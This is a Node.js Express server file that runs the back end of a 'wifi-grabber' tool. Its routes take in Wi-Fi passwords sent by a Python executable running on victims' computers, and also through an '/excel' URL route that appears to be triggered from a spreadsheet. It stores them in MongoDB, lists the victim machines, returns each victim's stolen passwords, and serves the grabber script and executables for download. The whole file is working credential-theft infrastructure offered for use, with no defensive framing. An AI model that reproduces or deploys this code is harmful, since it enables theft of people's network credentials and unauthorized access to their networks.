const express = require('express');
const app = express();
const cors = require('cors');
const fs = require('fs');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const model = require('./model');
app.use(bodyParser());
app.use(cors());


// Connect to mongo_db
const MONGODB_URL = 'YOUR_MONGO_URL'
mongoose.connect(MONGODB_URL,{ useCreateIndex: true, useNewUrlParser: true },(err)=>{
  console.log(err);
})

// first post request which would come from the python executable
app.post('/wifi-grabber',async (req,res) => {
  data = {
    name:req.body.name,
    data:req.body.data
  }
  try{
    await model.create(data);
  }catch(err){
    console.log(err);
    return res.status(500).send('error');
  }
  return res.status(200).send('OK');
})


// return everything that came through excel
app.get('/excel/:name/:passwords',async (req,res) => {
  let name = req.params.name
  let passwords = req.params.passwords
  name = name.substr(0,name.length-2)
  data = {
    name,
    data: passwords.split(":")
  }
  try{
    await model.create(data);
  }catch(err){
    console.log(err);
    return res.status(500).send('error');
  }
  return res.status(200).send("OK");
})


//returns the names of pc's that the executable ran on
app.get('/wifi-grabber',async (req,res)=>{
  try{
    data = await model.find({});
  }catch(err){
    console.log(err);
    return res.status(500).send('error');
  }
  response = []
  for(let i=0;i < data.length;i++){
    response.push(data[i].name);
  }
  return res.status(200).json(response);
})


//returns the wifi passwords that person has
app.get('/wifi-grabber/:name',async (req,res) => {
  let name = req.params.name;
  try{
    data = await model.findOne({name});
  }catch(err){
    console.log(err);
    return res.status(500).send('error');
  }
  return res.status(200).json(data);
})

//shows all paths so you wont have problems if you forgot one
app.get('/', (req,res)=>{
  return res.status(200).send('POST: /wifi-grabber, GET: /wifi-grabber,/wifi-grabber/:name, /python-password-grabber/wgx32.exe, /python-password-grabber/wgx64.exe,/python-password-grabber/wg.py');
})

//deletes a pc from the list
app.delete('/:name',async (req,res) =>{
  try{
    await model.deleteMany({name:req.params.name});
  }
  catch(err){
    console.log(err);
    return res.status(500).send('ERROR');
  }
  return res.status(200).send('OK');
})


//the python file so you can just download it anywhere from the site
app.get('/python-password-grabber/wg.py',(req,res)=>{
  fs.readFile('wifi-password-grabber.py',(err,data) => {
    if(err){
      return res.status(500).send("ERROR");
    }
    console.log(data)
    return res.status(200).send(data);
  })
})

//the listener to test the server
const port = process.env.PORT  || 5000;
app.listen(port, (err)=>{
  console.log('listening on port: '+ port);
});